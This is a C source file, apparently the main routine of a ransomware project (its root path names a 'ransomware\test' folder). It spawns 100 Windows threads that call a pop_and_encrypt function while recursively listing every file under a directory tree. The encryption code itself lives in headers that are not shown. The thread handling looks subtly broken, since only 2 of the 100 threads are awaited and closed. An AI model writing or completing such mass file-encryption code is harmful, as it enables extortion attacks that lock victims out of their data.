#include <stdio.h>
#include <windows.h>
#include <assert.h>
#include <time.h>
#include "stack.h"
#include "file_utils.h"
#include "encrypt.h"
#include "sync.h"


void free_str(void *element) {
    free(element);
}

int main(void) {
    sync_create_semaphore();
    sync_create_mutex();

    struct Stack *files_stack = stack_init();
    struct Stack *folders_stack = stack_init();

    /* THREADS */
    HANDLE threads[100];
    for(int i = 0; i < 100; ++i) {
        threads[i] = CreateThread(
            NULL,
            0,
            pop_and_encrypt,
            (LPVOID)files_stack,
            0,
            NULL
        );
    }
    /* THREADS */

    wchar_t root[] =  L"C:\\Users\\mouri\\Documents\\projects\\ransomware\\test\\";
    wchar_t *folder_path;

    assert(stack_is_empty(files_stack));
    assert(stack_is_empty(folders_stack));

    time_t start, end;

    start = time(NULL);
    do {
        if(stack_is_empty(folders_stack)) {
            if((folder_path = _wcsdup(root)) == NULL) {
                fprintf(stderr, "[ERROR] FOLDERPATH _WCSDUP\n");
                return 1;
            }
        } else {
            folder_path = (wchar_t*)stack_pop(folders_stack);
        }

        fu_populate_stacks_from_directory(folder_path, folders_stack, files_stack);
        free(folder_path);
    } while(!stack_is_empty(folders_stack));
    end = time(NULL);
    
    printf("done (files: %zu)\n", files_stack->size);
    printf("Temps écoulé : %lld secondes\n", end - start);

    WaitForMultipleObjects(2, threads, TRUE, INFINITE);
    for(int i = 0; i < 2; ++i) {
        CloseHandle(threads[i]);
    }
    assert(stack_is_empty(folders_stack));
    
    stack_free(&folders_stack, free_str);
    assert(stack_is_empty(files_stack));

    stack_free(&files_stack, free_str);
    sync_cleanup_mutex();
    sync_cleanup_semaphore();
    return 0;
}